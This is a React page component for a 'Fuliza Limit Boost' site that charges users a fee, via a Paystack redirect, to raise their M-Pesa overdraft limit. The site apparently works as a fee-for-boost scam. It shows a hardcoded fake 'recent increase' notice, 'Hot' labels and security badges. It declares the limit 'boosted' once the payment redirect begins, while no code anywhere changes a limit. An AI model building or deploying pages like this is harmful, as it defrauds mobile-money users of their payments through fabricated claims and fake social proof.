import { useState } from 'react';
import { Toaster, toast } from 'sonner';
import LimitCard from '../components/LimitCard';
import ProgressBar from '../components/ProgressBar';
import RecentIncrease from '../components/RecentIncrease';
import InfoBanner from '../components/InfoBanner';
import FulizaHeader from '../components/FulizaHeader';
import SecurityBadges from '../components/SecurityBadges';
import BackgroundBlobs from '../components/BackgroundBlobs';

const LIMIT_OPTIONS = [
  { amount: 5000, fee: 204 },
  { amount: 10000, fee: 408 },
  { amount: 15000, fee: 612 },
  { amount: 20000, fee: 816 },
  { amount: 25000, fee: 1020 },
  { amount: 30000, fee: 1224 },
  { amount: 35000, fee: 1428 },
  { amount: 40000, fee: 1632 },
  { amount: 45000, fee: 1836 },
  { amount: 50000, fee: 2040 },
  { amount: 55000, fee: 2244 },
  { amount: 60000, fee: 2448 },
  { amount: 65000, fee: 2652 },
  { amount: 70000, fee: 2856 },
];

export default function Index() {
  const [selectedLimit, setSelectedLimit] = useState<number | null>(null);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');

  const handleGetLimit = async () => {
    if (!selectedLimit) {
      toast.error('Please select a limit amount');
      return;
    }

    if (!phoneNumber) {
      toast.error('Please enter your phone number');
      return;
    }

    const option = LIMIT_OPTIONS.find((o) => o.amount === selectedLimit);
    if (!option) return;

    setPaymentStatus('processing');
    toast.loading('Initiating payment...');

    try {
      const response = await fetch('/api/paystack-initiate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone: phoneNumber,
          amount: option.fee,
          limitAmount: selectedLimit,
        }),
      });

      const data = await response.json();

      if (data.success && data.authorization_url) {
        setPaymentStatus('success');
        toast.success(`Redirecting to Paystack...`);
        // Redirect to Paystack
        window.location.href = data.authorization_url;
      } else {
        setPaymentStatus('failed');
        toast.error(data.message || 'Payment initiation failed');
      }
    } catch (error) {
      setPaymentStatus('failed');
      toast.error('Failed to initiate payment');
      console.error(error);
    }
  };

  return (
    <div className="relative min-h-screen">
      <BackgroundBlobs />
      <Toaster position="top-right" />

      <div className="relative z-10 max-w-6xl mx-auto px-4 py-12">
        <FulizaHeader />

        {paymentStatus === 'idle' && (
          <>
            <InfoBanner message="Select a limit amount and boost your M-Pesa balance instantly" />

            <div className="my-8">
              <h2 className="text-lg font-semibold text-gray-800 mb-4">Step 1: Enter Phone Number</h2>
              <div className="bg-white rounded-lg p-4 shadow-card mb-8">
                <input
                  type="tel"
                  placeholder="07XXXXXXXX"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-fuliza-green"
                />
              </div>

              <h2 className="text-lg font-semibold text-gray-800 mb-4">Step 2: Select Your Limit</h2>
              <ProgressBar currentStep={1} totalSteps={3} />

              <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 my-8">
                {LIMIT_OPTIONS.map((option) => (
                  <LimitCard
                    key={option.amount}
                    amount={option.amount}
                    fee={option.fee}
                    isHot={option.amount === 10000 || option.amount === 30000}
                    selected={selectedLimit === option.amount}
                    onClick={() => setSelectedLimit(option.amount)}
                  />
                ))}
              </div>

              <RecentIncrease phone="07XX XXX XXXX" amount={25000} timeAgo="2 minutes ago" />

              <SecurityBadges />

              {selectedLimit && (
                <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t border-gray-200 md:static md:bg-transparent md:border-t-0 md:p-0 animate-slide-up z-50">
                  <button
                    onClick={handleGetLimit}
                    className="w-full bg-fuliza-green hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition-all transform active:scale-95 shadow-lg text-lg"
                  >
                    Get Limit Now (Allow for Ksh {selectedLimit.toLocaleString()})
                  </button>
                </div>
              )}
            </div>
          </>
        )}

        {paymentStatus === 'processing' && (
          <div className="text-center py-12">
            <div className="inline-block animate-spin">
              <div className="w-12 h-12 border-4 border-gray-300 border-t-fuliza-green rounded-full" />
            </div>
            <p className="mt-4 text-gray-700">Processing your payment...</p>
            <p className="text-sm text-gray-500 mt-2">Check your phone for the M-Pesa prompt</p>
          </div>
        )}

        {paymentStatus === 'success' && (
          <div className="bg-green-50 border-2 border-fuliza-green rounded-lg p-8 text-center">
            <div className="text-4xl mb-4">✓</div>
            <h2 className="text-2xl font-bold text-fuliza-green mb-2">Success!</h2>
            <p className="text-gray-700 mb-4">
              Your limit has been boosted to Ksh {selectedLimit?.toLocaleString()}.
            </p>
            <p className="text-sm text-gray-600">Thank you for using Fuliza Limit Boost.</p>
            <button
              onClick={() => {
                setPaymentStatus('idle');
                setSelectedLimit(null);
                setPhoneNumber('');
              }}
              className="mt-6 bg-fuliza-green text-white font-bold py-2 px-6 rounded-lg hover:bg-green-700 transition-colors"
            >
              Boost Another Limit
            </button>
          </div>
        )}

        {paymentStatus === 'failed' && (
          <div className="bg-red-50 border-2 border-fuliza-red rounded-lg p-8 text-center">
            <div className="text-4xl mb-4">✗</div>
            <h2 className="text-2xl font-bold text-fuliza-red mb-2">Payment Failed</h2>
            <p className="text-gray-700 mb-4">
              We couldn't process your payment. Please try again.
            </p>
            <button
              onClick={() => {
                setPaymentStatus('idle');
              }}
              className="mt-6 bg-fuliza-red text-white font-bold py-2 px-6 rounded-lg hover:bg-red-700 transition-colors"
            >
              Try Again
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
